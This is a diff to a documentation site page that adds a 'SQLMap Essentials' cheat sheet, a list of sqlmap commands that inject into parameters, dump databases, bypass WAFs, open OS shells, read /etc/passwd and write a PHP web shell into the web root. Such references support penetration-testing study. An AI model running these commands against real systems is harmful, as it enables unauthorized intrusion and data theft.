@@ -165,7 +165,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#readme" class="md-skip">
+        <a href="#sqlmap-essentials" class="md-skip">
           Skip to content
         </a>
       
@@ -1275,6 +1275,24 @@
         
       
       
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SQLMap
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
       <a href="./" class="md-nav__link md-nav__link--active">
         
   
@@ -1291,6 +1309,69 @@
   
 
       </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#basic-usage" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Basic Usage
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#enumeration-flags" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Enumeration Flags
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#advanced-options" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Advanced Options
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#shell-access" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Shell Access
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
       
     </li>
   
@@ -2841,6 +2922,58 @@
     
   
   
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#basic-usage" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Basic Usage
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#enumeration-flags" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Enumeration Flags
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#advanced-options" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Advanced Options
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#shell-access" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Shell Access
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
 </nav>
                   </div>
                 </div>
@@ -2859,7 +2992,75 @@
   
 
 
-<h1 id="readme">README<a class="headerlink" href="#readme" title="Permanent link">&para;</a></h1>
+<h1 id="sqlmap-essentials">SQLMap Essentials<a class="headerlink" href="#sqlmap-essentials" title="Permanent link">&para;</a></h1>
+<p>Automated SQL injection tool. Detects and exploits SQLi in GET/POST parameters, cookies, and HTTP headers.</p>
+<h2 id="basic-usage">Basic Usage<a class="headerlink" href="#basic-usage" title="Permanent link">&para;</a></h2>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="c1"># GET parameter</span>
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;http://target.com/item?id=1&quot;</span>
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="c1"># POST parameter</span>
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;http://target.com/login&quot;</span><span class="w"> </span>--data<span class="o">=</span><span class="s2">&quot;user=admin&amp;pass=test&quot;</span>
+</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>
+</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a><span class="c1"># Cookie injection</span>
+</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a>sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;http://target.com/page&quot;</span><span class="w"> </span>--cookie<span class="o">=</span><span class="s2">&quot;id=1&quot;</span>
+</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a>
+</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a><span class="c1"># From Burp request file</span>
+</span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a>sqlmap<span class="w"> </span>-r<span class="w"> </span>request.txt
+</span><span id="__span-0-12"><a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a>
+</span><span id="__span-0-13"><a id="__codelineno-0-13" name="__codelineno-0-13" href="#__codelineno-0-13"></a><span class="c1"># Specify parameter</span>
+</span><span id="__span-0-14"><a id="__codelineno-0-14" name="__codelineno-0-14" href="#__codelineno-0-14"></a>sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;http://target.com/?id=1&amp;name=test&quot;</span><span class="w"> </span>-p<span class="w"> </span>id
+</span></code></pre></div>
+<h2 id="enumeration-flags">Enumeration Flags<a class="headerlink" href="#enumeration-flags" title="Permanent link">&para;</a></h2>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="c1"># Get databases</span>
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;http://target.com/?id=1&quot;</span><span class="w"> </span>--dbs
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>
+</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a><span class="c1"># Get tables from DB</span>
+</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a>sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;http://target.com/?id=1&quot;</span><span class="w"> </span>-D<span class="w"> </span>target_db<span class="w"> </span>--tables
+</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a>
+</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a><span class="c1"># Get columns from table</span>
+</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a>sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;http://target.com/?id=1&quot;</span><span class="w"> </span>-D<span class="w"> </span>target_db<span class="w"> </span>-T<span class="w"> </span>users<span class="w"> </span>--columns
+</span><span id="__span-1-9"><a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a>
+</span><span id="__span-1-10"><a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a><span class="c1"># Dump table</span>
+</span><span id="__span-1-11"><a id="__codelineno-1-11" name="__codelineno-1-11" href="#__codelineno-1-11"></a>sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;http://target.com/?id=1&quot;</span><span class="w"> </span>-D<span class="w"> </span>target_db<span class="w"> </span>-T<span class="w"> </span>users<span class="w"> </span>--dump
+</span><span id="__span-1-12"><a id="__codelineno-1-12" name="__codelineno-1-12" href="#__codelineno-1-12"></a>
+</span><span id="__span-1-13"><a id="__codelineno-1-13" name="__codelineno-1-13" href="#__codelineno-1-13"></a><span class="c1"># Dump all (careful with large DBs)</span>
+</span><span id="__span-1-14"><a id="__codelineno-1-14" name="__codelineno-1-14" href="#__codelineno-1-14"></a>sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;http://target.com/?id=1&quot;</span><span class="w"> </span>--dump-all
+</span></code></pre></div>
+<h2 id="advanced-options">Advanced Options<a class="headerlink" href="#advanced-options" title="Permanent link">&para;</a></h2>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="c1"># Increase verbosity</span>
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;...&quot;</span><span class="w"> </span>-v<span class="w"> </span><span class="m">3</span>
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>
+</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a><span class="c1"># Set DB type (faster)</span>
+</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a>sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;...&quot;</span><span class="w"> </span>--dbms<span class="o">=</span>mysql
+</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a>
+</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a><span class="c1"># Set risk/level (more aggressive)</span>
+</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a>sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;...&quot;</span><span class="w"> </span>--level<span class="o">=</span><span class="m">5</span><span class="w"> </span>--risk<span class="o">=</span><span class="m">3</span>
+</span><span id="__span-2-9"><a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a>
+</span><span id="__span-2-10"><a id="__codelineno-2-10" name="__codelineno-2-10" href="#__codelineno-2-10"></a><span class="c1"># Batch mode (no prompts)</span>
+</span><span id="__span-2-11"><a id="__codelineno-2-11" name="__codelineno-2-11" href="#__codelineno-2-11"></a>sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;...&quot;</span><span class="w"> </span>--batch
+</span><span id="__span-2-12"><a id="__codelineno-2-12" name="__codelineno-2-12" href="#__codelineno-2-12"></a>
+</span><span id="__span-2-13"><a id="__codelineno-2-13" name="__codelineno-2-13" href="#__codelineno-2-13"></a><span class="c1"># Skip URL encoding</span>
+</span><span id="__span-2-14"><a id="__codelineno-2-14" name="__codelineno-2-14" href="#__codelineno-2-14"></a>sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;...&quot;</span><span class="w"> </span>--no-escape
+</span><span id="__span-2-15"><a id="__codelineno-2-15" name="__codelineno-2-15" href="#__codelineno-2-15"></a>
+</span><span id="__span-2-16"><a id="__codelineno-2-16" name="__codelineno-2-16" href="#__codelineno-2-16"></a><span class="c1"># Use proxy</span>
+</span><span id="__span-2-17"><a id="__codelineno-2-17" name="__codelineno-2-17" href="#__codelineno-2-17"></a>sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;...&quot;</span><span class="w"> </span>--proxy<span class="o">=</span><span class="s2">&quot;http://127.0.0.1:8080&quot;</span>
+</span><span id="__span-2-18"><a id="__codelineno-2-18" name="__codelineno-2-18" href="#__codelineno-2-18"></a>
+</span><span id="__span-2-19"><a id="__codelineno-2-19" name="__codelineno-2-19" href="#__codelineno-2-19"></a><span class="c1"># WAF bypass — tamper scripts</span>
+</span><span id="__span-2-20"><a id="__codelineno-2-20" name="__codelineno-2-20" href="#__codelineno-2-20"></a>sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;...&quot;</span><span class="w"> </span>--tamper<span class="o">=</span>space2comment,between,randomcase
+</span></code></pre></div>
+<h2 id="shell-access">Shell Access<a class="headerlink" href="#shell-access" title="Permanent link">&para;</a></h2>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="c1"># OS shell (if DB user has FILE privilege)</span>
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;...&quot;</span><span class="w"> </span>--os-shell
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>
+</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a><span class="c1"># SQL shell</span>
+</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a>sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;...&quot;</span><span class="w"> </span>--sql-shell
+</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a>
+</span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a><span class="c1"># Read file</span>
+</span><span id="__span-3-8"><a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a>sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;...&quot;</span><span class="w"> </span>--file-read<span class="o">=</span><span class="s2">&quot;/etc/passwd&quot;</span>
+</span><span id="__span-3-9"><a id="__codelineno-3-9" name="__codelineno-3-9" href="#__codelineno-3-9"></a>
+</span><span id="__span-3-10"><a id="__codelineno-3-10" name="__codelineno-3-10" href="#__codelineno-3-10"></a><span class="c1"># Write file</span>
+</span><span id="__span-3-11"><a id="__codelineno-3-11" name="__codelineno-3-11" href="#__codelineno-3-11"></a>sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;...&quot;</span><span class="w"> </span>--file-write<span class="o">=</span><span class="s2">&quot;shell.php&quot;</span><span class="w"> </span>--file-dest<span class="o">=</span><span class="s2">&quot;/var/www/html/shell.php&quot;</span>
+</span></code></pre></div>
 
 
 
